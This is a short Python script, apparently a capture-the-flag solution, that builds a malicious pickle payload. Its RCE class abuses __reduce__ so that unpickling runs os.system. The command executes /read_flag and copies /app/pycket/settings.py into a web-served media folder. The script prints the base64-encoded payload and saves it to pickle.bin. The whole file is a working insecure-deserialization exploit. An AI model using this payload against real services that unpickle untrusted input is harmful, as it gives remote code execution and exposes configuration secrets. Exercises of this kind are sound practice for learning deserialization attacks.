import base64
import os
import pickle


class RCE:
    def __reduce__(self):
        cmd = "(/read_flag && cat /app/pycket/settings.py) > /app/media/flag_out"

        return os.system, (cmd,)


if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled))
    with open("pickle.bin", "wb") as f:
        f.write(pickled)
